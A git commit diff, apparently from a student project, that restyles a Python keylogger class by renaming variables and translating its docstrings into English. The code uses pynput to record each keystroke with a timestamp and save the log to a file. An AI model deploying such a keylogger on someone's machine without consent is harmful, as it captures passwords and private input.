d89a925188978004cb6a28bf91c242788d0de1e4
GuerroisTheo <theo.guerrois@edu.esiee.fr>
2020-06-10 10:47:24 +0200

    Convention
    Convention

--- keylog.py
+++ keylog.py
@@ -1,3 +1,6 @@
+"""
+all imports necessary to carry out this process
+"""
 import pynput
 from pynput import keyboard
 from datetime import datetime
@@ -6,54 +9,60 @@ from datetime import datetime
 
 class KeyLogger:
     """
-    Classe permettant de créer des keyloggers et de les contrôller
+    Class for creating keyloggers and controlling them
     """
     def __init__(self):
         """
-        Un keylogger stock les logs d'inputs reçu dans une liste keys
+        A keylogger stores the received input logs in a 'a_keys' list.
         """
-        self.keys = []
+        self.a_keys = []
 
-        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.a_listener = keyboard.Listener(on_press=self.on_press)
 
-  
-    def on_press(self,key):
-            log = ( datetime.now().time(), key )
-            self.keys.append(log)
+    """
+    fills the list with a time and the key pressed
+    """
+    def on_press(self,p_key):
+            log = ( datetime.now().time(), p_key )
+            self.a_keys.append(log)
     
+    """
+    return the number of keys pressed
+    """
     def CountKey(self):
         count = 0
-        for key in self.keys:
+        for key in self.a_keys:
             count +=1
         return count
 
-    def getNumKeys(self,key):
-        """
-        return the number of a given key (parameter)
-        """
+    """
+    return the number of a given key (parameter)
+    """
+    def getNumKeys(self,p_key):
         numKey = 0
-        for i in self.keys:
-            if key in str(i[1]):
+        for i in self.a_keys:
+            if p_key in str(i[1]):
                 numKey +=1
         return numKey
        
-     
-
-    def write_on_file(self,filename):
-            with open(filename,'w') as f:
-                for key in self.keys:
+    """
+    opens and fills a file with the list 'a_key'.
+    """
+    def write_on_file(self,p_filename):
+            with open(p_filename,'w') as f:
+                for key in self.a_keys:
                     f.write(str(key))
                     f.write("\n")
             f.close()
-
+        
+    """
+    starts the keylogger
+    """
     def start(self):
-        """
-        permet de démarrer le keylogger
-        """
-        self.listener.start()
+        self.a_listener.start()
 
+    """
+    stops the keylogger
+    """
     def stop(self):
-        """
-        permet d'arrêter le keylogger
-        """
-        self.listener.stop()
+        self.a_listener.stop()
